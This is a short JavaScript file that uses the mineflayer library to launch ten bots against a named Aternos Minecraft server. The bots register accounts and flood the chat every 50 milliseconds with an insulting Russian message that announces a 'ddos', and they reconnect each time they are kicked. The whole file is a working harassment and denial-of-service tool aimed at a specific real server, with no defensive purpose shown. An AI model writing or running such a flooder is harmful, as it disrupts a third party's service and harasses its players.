process.env.NODE_NO_WARNINGS = '1';
const mineflayer = require('mineflayer');

function createBot() {
    const username = `ddosgovna_${Math.random().toString(36).substring(2, 8)}`;
    
    const bot = mineflayer.createBot({
        host: 'shinasmp.aternos.me',
        port: 11048,
        username: username,
        version: '1.21.1',
        checkTimeoutInterval: 30000
    });

    bot.once('spawn', () => {
        bot.chat('/register lol999111 lol999111');
        
        setTimeout(() => {
            setInterval(() => {
                bot.chat(`чота вы распизделись, ловите дудос жопы от либари ${Math.random().toString(36).substring(2, 5)}`);
            }, 50); 
        }, 1000);
    });

    const reconnect = () => {
        bot.removeAllListeners();
        setTimeout(createBot, 1500);
    };

    bot.on('error', reconnect);
    bot.on('kicked', reconnect);
    bot.on('end', reconnect);
}

for (let i = 0; i < 10; i++) {
    setTimeout(createBot, i * 1000);
}
